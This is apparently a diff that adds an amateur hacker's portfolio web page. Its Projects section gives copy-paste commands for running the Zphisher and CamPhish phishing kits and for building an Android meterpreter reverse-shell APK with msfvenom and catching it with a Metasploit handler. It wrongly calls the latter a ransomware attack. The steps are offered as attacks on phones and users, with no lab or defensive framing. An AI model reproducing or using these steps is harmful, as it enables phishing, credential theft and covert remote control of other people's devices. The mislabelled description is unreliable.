@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyberg Hawk</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="logo.png">
+</head>
+<body>
+    <div class="container">
+        <aside class="sidebar">
+            <div class="profile">
+                <img src="logo.png" alt="Hacker" class="profile-image">
+                <h1 class="name">Cyberg Hawk</h1>
+            </div>
+            <nav class="nav">
+                <ul>
+                    <li><a href="#home">Home</a></li><br><br>
+                    <li><a href="#about">About</a></li><br><br>
+                    <li><a href="#projects">Projects</a></li><br><br>
+                    <li><a href="#contact">Contact</a></li>
+                </ul>
+            </nav>
+        </aside>
+        <main class="main-content">
+            <section id="home">
+                <h2>Welcome To My Portfolio Website</h2>
+                <img src="5.jpg">
+                <img src="2.jpg"><br><br>
+                <h1>Cyberg Hawk</h1>
+            </section>
+            <section id="about">
+                <h2>About Me</h2>
+                <center>
+                <img src="logo.png">
+                </center>
+                <br><br>
+                <p>I'm Cyberg Hawk, a hacker and cybersecurity expert. Explore my portfolio to learn more about my work and skills. Thank You!</p>
+            </section>
+            <section id="projects">
+                <h2>Projects</h2>
+                <div class="project">
+                    <h3>Project One</h3>
+                    <br><br>
+                    <p>In this project we are going to do a phishing attack using tools like:- Zphisher and CamPhish</p><br><br>
+                    <center>
+                    <h2>Using: Zphisher</h2>
+                    </center>
+                    <h4>Step-1: Install Zphisher from git hub by using this command:<br><br><code>git clone https://github.com/htr-tech/zphisher.git</code></h4>
+                    <br><br>
+                    <h5>Then execute the following commands:<br><br><code>cd zphisher</code><br><br><code>chmod +x zphisher.sh</code><br><br><code>bash ./zphisher.sh</code></h5>
+                    <center>
+                    <br><br>
+                    <h2>Using: CamPhish</h2>
+                    </center>
+                    <h4>Step-1: Install CamPhish from git hub by using this command:<br><br><code>git clone https://github.com/techchipnet/CamPhish.git</code></h4>
+                    <br><br>
+                    <h5>Then execute the following commands:<br><br><code>cd CamPhish</code><br><br><code>chmod +x camphish.sh</code><br><br><code>bash ./camphish.sh</code></h5><br><br>
+                    <h3>Project one has ended to learn more search on youtube and you will get more inforamtions</h3>
+                </div>
+                <div class="project">
+                    <h3>Project Two</h3>
+                    <br><br>
+                    <p>In this project we are going to do a ransomeware attack using tool like:- Metasploit(meterpreter shell)</p><br><br>
+                    <h2>Metasploit: meterpreter</h2><br><br>
+                    <h4>Step-1: on the new kali linux os (2024.2) Metasploit is already installed so we are going to exploit an android phone.</h4><br><br>
+                    <h4>open your terminal then type the following commands:<br><br><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=< your ip here > LPORT=< your port here > -o android.apk</code></h4><br><br>
+                    <h4>Replace "< your ip here >" with your ip address and "< your port here >" with any port you want like 4444, 443, 8080, 4545 etc ...</h4><br><br>
+                    <h4>Open another terminal</h4><br><br>
+                    <h5>Then execute the following commands:<br><br><code>msfconsole</code><br><br><code>use exploit/multi/handler</code><br><br><code>set payload android/meterpreter/reverse_tcp</code><br><br><code>set LHOST < your ip here ><code><br><br><code>set LPORT < your port here ></code><br><br><code>exploit</code></h5>
+                </div>
+            </section>
+            <section id="contact">
+                <h2>Contact</h2>
+                <img src="co.jpg"><br><br>
+                <h1>Email: bromaxbm2@gmail.com</h1>
+            </section>
+        </main>
+    </div>
+    <footer>
+        <p>&copy; 2024 CYBERG HAWK</p>
+    </footer>
+</body>
+</html>
